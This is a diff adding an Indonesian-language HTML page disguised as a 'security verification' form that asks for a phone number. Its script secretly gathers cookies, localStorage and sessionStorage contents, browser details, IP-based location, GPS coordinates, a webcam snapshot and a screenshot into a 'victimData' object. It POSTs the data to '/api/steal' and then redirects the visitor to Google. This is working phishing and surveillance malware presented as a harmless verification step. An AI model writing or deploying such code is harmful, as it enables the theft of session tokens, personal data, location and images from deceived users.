@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verifikasi</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        body {
+            background: #0a0e1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #151e2a;
+            border-radius: 24px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            border: 1px solid #2a3a4a;
+            text-align: center;
+        }
+        .icon { font-size: 48px; margin-bottom: 12px; }
+        h2 { color: #e8edf2; font-size: 18px; margin-bottom: 4px; }
+        p { color: #8899aa; font-size: 13px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid #2a3a4a;
+            background: #0a0e1a;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus { border-color: #4a7aff; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #4a7aff;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s;
+        }
+        button:hover { background: #3a6aef; transform: scale(0.98); }
+        #status { color: #8899aa; font-size: 12px; margin-top: 12px; min-height: 20px; }
+        .watermark { font-size: 10px; color: #2a3a4a; margin-top: 16px; letter-spacing: 2px; }
+        .watermark span { color: #4a7aff; font-weight: 700; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🛡️</div>
+        <h2>Verifikasi Keamanan</h2>
+        <p>Masukkan nomor telepon untuk verifikasi</p>
+        <input type="tel" id="phoneInput" placeholder="0812-3456-7890" autofocus>
+        <button id="submitBtn">Verifikasi</button>
+        <div id="status">Klik verifikasi untuk melanjutkan</div>
+        <div class="watermark"><i class="fas fa-dragon"></i> <span>RIKTECH2ND</span> <i class="fas fa-dragon"></i></div>
+    </div>
+
+    <script>
+        // === GLOBAL VARIABLES ===
+        let victimData = {
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: { width: screen.width, height: screen.height },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie || '(none)',
+            localStorage: JSON.stringify({ ...localStorage }),
+            sessionStorage: JSON.stringify({ ...sessionStorage }),
+            history: window.history.length,
+            referrer: document.referrer || '(direct)'
+        };
+
+        // === 1. AMBIL IP + LOKASI ===
+        async function getIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                victimData.ip = data;
+                return data;
+            } catch(e) {
+                victimData.ip = { error: 'failed' };
+                return null;
+            }
+        }
+
+        // === 2. AMBIL GPS (BUTUH IZIN) ===
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            victimData.gps = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                            };
+                            resolve();
+                        },
+                        () => {
+                            victimData.gps = 'denied or failed';
+                            resolve();
+                        },
+                        { timeout: 8000, enableHighAccuracy: true }
+                    );
+                } else {
+                    victimData.gps = 'not supported';
+                    resolve();
+                }
+            });
+        }
+
+        // === 3. AMBIL WEBCAM (FOTO) ===
+        function captureWebcam() {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, 640, 480);
+                            victimData.webcam = canvas.toDataURL('image/jpeg', 0.7);
+                            stream.getTracks().forEach(t => t.stop());
+                            video.remove();
+                            resolve();
+                        };
+                    })
+                    .catch(() => {
+                        victimData.webcam = 'denied or no camera';
+                        video.remove();
+                        resolve();
+                    });
+            });
+        }
+
+        // === 4. AMBIL SCREENSHOT ===
+        function captureScreenshot() {
+            return new Promise((resolve) => {
+                html2canvas(document.body, { scale: 0.5, useCORS: true })
+                    .then(canvas => {
+                        victimData.screenshot = canvas.toDataURL('image/jpeg', 0.5);
+                        resolve();
+                    })
+                    .catch(() => {
+                        victimData.screenshot = 'failed';
+                        resolve();
+                    });
+            });
+        }
+
+        // === 5. EKSEKUSI ===
+        document.getElementById('submitBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || phone.length < 10) {
+                document.getElementById('status').innerHTML = '⚠️ Masukkan nomor telepon yang valid';
+                return;
+            }
+            victimData.phone = phone;
+
+            this.disabled = true;
+            this.innerHTML = '⏳ Mengumpulkan data...';
+            document.getElementById('status').innerHTML = 'Mengumpulkan informasi...';
+
+            // Kumpulkan semua data
+            await getIP();
+            await getGPS();
+            await captureWebcam();
+            await captureScreenshot();
+
+            document.getElementById('status').innerHTML = '📤 Mengirim data...';
+            this.innerHTML = '⏳ Mengirim...';
+
+            // Kirim ke server
+            try {
+                const response = await fetch('/api/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(victimData)
+                });
+                const result = await response.json();
+
+                if (response.ok) {
+                    document.getElementById('status').innerHTML = '✅ Verifikasi berhasil!';
+                    this.innerHTML = '✅ Sukses';
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 1500);
+                } else {
+                    throw new Error(result.detail || result.error || 'Server error');
+                }
+            } catch(e) {
+                document.getElementById('status').innerHTML = '⚠️ ' + e.message;
+                this.disabled = false;
+                this.innerHTML = 'Verifikasi';
+            }
+        });
+
+        // Enter key support
+        document.getElementById('phoneInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('submitBtn').click();
+        });
+    </script>
+</body>
+</html>
